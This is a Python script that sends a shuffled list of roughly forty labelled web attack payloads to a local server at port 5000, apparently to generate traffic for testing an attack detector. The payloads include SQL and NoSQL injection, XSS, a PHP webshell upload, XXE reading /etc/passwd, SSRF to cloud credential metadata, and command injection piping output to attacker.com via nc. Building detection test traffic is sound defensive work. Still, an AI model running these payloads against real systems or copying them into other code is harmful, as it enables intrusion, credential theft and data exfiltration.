#!/usr/bin/env python3
import urllib.request
import urllib.error
import json
import time
import random

URL = "http://localhost:5000"

payloads = [
    # 1. SQL Injection
    {"path": "/login?user=admin' OR 1=1 --", "method": "GET"},
    {"path": "/search?q=UNION SELECT password FROM users", "method": "GET"},
    
    # 2. XSS
    {"path": "/forum?post=<script>alert('XSS')</script>", "method": "GET"},
    {"path": "/profile?name=<img src=x onerror=prompt()>", "method": "GET"},
    
    # 3. LFI
    {"path": "/theme?file=../../../../etc/passwd", "method": "GET"},
    {"path": "/index?page=php://filter/read=convert.base64-encode/resource=config", "method": "GET"},
    
    # 4. RFI
    {"path": "/load?url=http://attacker.com/webshell.txt", "method": "GET"},
    
    # 5. Command Injection
    {"path": "/ping?ip=127.0.0.1; cat /etc/shadow", "method": "GET"},
    {"path": "/exec?cmd=ls -la | nc attacker.com 1337", "method": "GET"},
    
    # 6. Directory Traversal
    {"path": "/static/..%2f..%2f..%2f..%2fetc%2fpasswd", "method": "GET"},
    
    # 7. File Upload
    {"path": "/upload", "method": "POST", "body": "<?php system($_GET['cmd']); ?>", "headers": {"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryX", "Content-Disposition": "form-data; name=\"file\"; filename=\"shell.php\""}},
    
    # 8. SSRF
    {"path": "/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/", "method": "GET"},
    {"path": "/proxy?url=dict://localhost:11211/stat", "method": "GET"},
    
    # 9. SSTI
    {"path": "/hello?name={{7*'7'}}", "method": "GET"},
    {"path": "/greet?user=${7*7}", "method": "GET"},
    
    # 10. XXE
    {"path": "/xml_parse", "method": "POST", "headers": {"Content-Type": "application/xml"}, "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'},
    
    # 11. Deserialization
    {"path": "/api/data", "method": "POST", "body": '{"user": "O:8:\"stdClass\":0:{}"}', "headers": {"Content-Type": "application/json"}},
    
    # 12. JWT Attack
    {"path": "/dashboard", "method": "GET", "headers": {"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ."}},
    
    # 13. Auth Bypass
    {"path": "/login", "method": "POST", "body": '{"username": {"$gt": ""}, "password": {"$gt": ""}}', "headers": {"Content-Type": "application/json"}},
    
    # 14. Open Redirect
    {"path": "/redirect?to=http://evil-phishing.com", "method": "GET"},
    {"path": "/login?next=//evil.com", "method": "GET"},
    
    # 15. API Enum
    {"path": "/api/v2/users", "method": "GET"},
    {"path": "/graphql?query={users{id,email}}", "method": "GET"},
    
    # 16. Bot Scan
    {"path": "/wp-admin/install.php", "method": "GET"},
    {"path": "/.env.backup", "method": "GET"},
    
    # 17. Sensitive File
    {"path": "/.git/config", "method": "GET"},
    {"path": "/config/database.yml", "method": "GET"},
    
    # 18. Admin Access
    {"path": "/admin/dashboard", "method": "GET"},
    {"path": "/administrator/index.php", "method": "GET"},
    
    # 19. Header Injection
    {"path": "/", "method": "GET", "headers": {"X-Forwarded-Host": "evil.com\\r\\nSet-Cookie: session=hacked"}},
    
    # 20. Cookie Injection
    {"path": "/", "method": "GET", "headers": {"Cookie": "admin=1; select * from users;"}},
    
    # 21. Path Encoding
    {"path": "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", "method": "GET"},
    
    # 22. Reconnaissance
    {"path": "/server-status", "method": "GET"},
    
    # 23. Protocol Attack
    {"path": "/%00index.php", "method": "GET"},
    
    # 24. Java Attack
    {"path": "/struts?class.module.classLoader.URLs[0]=0", "method": "GET"},
    
    # 25. PHP Injection
    {"path": "/index.php?arg=phpinfo()", "method": "GET"},

    # 26. Unknown (Needs Classification)
    {"path": "/search?q=SUPER_OBFUSCATED_[AND]_RANDOM_DATA_{{AAAABBBBCCCC1234}}", "method": "GET"},
    {"path": "/submit?data=HEX_X_99_A_G_THEN_UNEXPECTED_CARRIAGE_RETURN", "method": "GET"},
    {"path": "/api/v1/beta?x=UNUSUAL_CUSTOM_BIN_FORMAT_LIKE_[x00x01x02]&y=1", "method": "GET"},
    {"path": "/login", "method": "POST", "body": "WEIRD_CUSTOM_XML_OR_GQL_NOT_MATCHING_ANY_SIGNATURE", "headers": {"Content-Type": "text/plain"}}
]

print(f"Executing {len(payloads)} attacks against {URL}...")
random.shuffle(payloads)

success = 0
for idx, p in enumerate(payloads):
    # Parse path and encode it properly
    parsed_url = urllib.parse.urlparse(p["path"])
    safe_path = urllib.parse.quote(parsed_url.path)
    safe_query = urllib.parse.quote(parsed_url.query, safe="=&")
    
    full_path = safe_path
    if safe_query:
        full_path += "?" + safe_query
        
    req_url = URL + full_path
    req = urllib.request.Request(req_url, method=p["method"])
    
    for k, v in p.get("headers", {}).items():
        req.add_header(k, v)
        
    data = p.get("body", None)
    if data:
        data = data.encode('utf-8')
        
    try:
        response = urllib.request.urlopen(req, data=data, timeout=3)
        status = response.getcode()
    except urllib.error.HTTPError as e:
        status = e.code
    except Exception as e:
        print(f"[{idx+1}/{len(payloads)}] Error sending {p['method']} {p['path']}: {e}")
        continue
        
    print(f"[{idx+1}/{len(payloads)}] Sent {p['method']} {p['path']} (Status: {status})")
    time.sleep(0.1) # Small delay
    
print(f"\\nAll {len(payloads)} attacks executed.")
